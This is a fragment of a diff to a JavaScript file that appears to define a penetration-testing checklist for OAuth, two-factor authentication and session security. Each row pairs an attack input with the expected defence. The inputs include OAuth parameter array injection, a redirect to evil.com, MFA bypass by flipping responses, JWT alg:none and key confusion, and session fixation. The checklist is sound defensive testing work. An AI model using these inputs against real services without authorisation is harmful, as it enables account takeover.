 AUTH-51|Logout/Token Revocation|OAuth logout doesn't revoke tokens¦refresh token still valid after logout|Token revocation implemented
+AUTH-154|redirect_uri as Array|redirect_uri[]=https://evil.com|Rejected
+AUTH-155|State Array/Object Injection|state[]=a&state[]=b|Rejected
+AUTH-156|Scope Array Injection|scope[]=admin&scope[]=read|Validated
+AUTH-157|response_type Array Injection|response_type[]=code&response_type[]=token|Rejected
+AUTH-158|client_id Array Injection|client_id[]=a&client_id[]=b|Rejected
+AUTH-159|Nonce Array/Reuse|nonce[]=...¦replay nonce|Bound to session, single-use
+AUTH-160|Code Array in Token Exchange|code[]=victim_code|Rejected
+AUTH-161|PKCE code_verifier Array/Bypass|Omit or array code_verifier|PKCE enforced
+AUTH-162|grant_type Array Injection|grant_type[]=password&grant_type[]=client_credentials|Rejected
+AUTH-163|client_secret Array/Type Confusion|client_secret[]=...|Type check
+AUTH-164|Device-Code Phishing/Brute-force|Guess user_code¦social engineering|Rate limit + short TTL
+AUTH-165|Consent Phishing|Malicious app requests broad scopes|Scope review enforced
+AUTH-166|OAuth Mix-up Attack|Cross-IdP confusion|Per-IdP state binding
+AUTH-167|Hybrid Flow Injection|Inject code + id_token|Flow isolation
+AUTH-168|Refresh Token Array/Rotation Bypass|refresh_token[]=...|Type check + rotation
+AUTH-169|Token Endpoint Content-Type Confusion|JSON vs form|Single canonical format
+AUTH-170|aud Claim Injection|Modify aud in code/ID token|Signature + aud validation
+AUTH-171|id_token_hint Array/Tampering|id_token_hint[]=...|Validated
+AUTH-172|login_hint Array/Account Takeover|login_hint=victim@x.com|Bound to session
+AUTH-173|prompt=none Bypass|Skip consent via prompt=none|Consent enforced
 #AU-MFA|5|web|2FA / MFA
 AUTH-52|2FA Bypass via Response Manipulation|Flip verified:false→true¦mfa_required:true→false¦status code 403→200¦remove OTP parameter entirely|Server-side enforcement, not client-side
 AUTH-53|Direct Access to Post-2FA Pages|Access /dashboard after password only¦skip /mfa/verify step|Partially-authenticated session rejected
@@ -590,7 +929,17 @@ AUTH-72|Session Timeout|No idle timeout¦no absolute timeout¦timeout too long|I
 AUTH-73|Concurrent Sessions|Multiple logins allowed without limit¦old sessions not invalidated|Policy enforced
 AUTH-74|Session After Password Change|Other sessions remain valid after password change|All sessions invalidated
 AUTH-75|JWT-Specific (if used)|alg:none¦RS256→HS256 confusion¦weak HMAC secret¦kid injection¦claim tampering (role, sub)¦expired token accepted|Signature verified, claims validated, expiry enforced
-AUTH-76|Session Puzzling|Session variable overwrite across modules¦shared session namespace|Session isolation`;
+AUTH-76|Session Puzzling|Session variable overwrite across modules¦shared session namespace|Session isolation
+AUTH-174|Session Puzzling Deep|Overwrite session var across modules¦cross-module session reuse|Namespaced session
+AUTH-175|Session Token Array|session[]=token|Rejected
+AUTH-176|Cookie Array|Cookie: session=a; session=b|Defined merge policy
+AUTH-177|Multiple Cookie Headers|Two Cookie headers|Rejected
+AUTH-178|Session Fixation via Array|session[]=attacker|Rotated on login
+AUTH-179|Session Token in JSON Body|{"session":"..."}|Not accepted
+AUTH-180|Session Token in Custom Header|X-Session: ...|Not accepted / validated
+AUTH-181|Session Token in URL Array|?session[]=...|Rejected
+AUTH-182|Session Entropy via Array|Predict with array input|CSPRNG
+AUTH-183|JWT Array Injection|{"role":["admin","user"]}|Type check`;
 
 const SUITES = [];
 RAW.split("\n").forEach(line => {
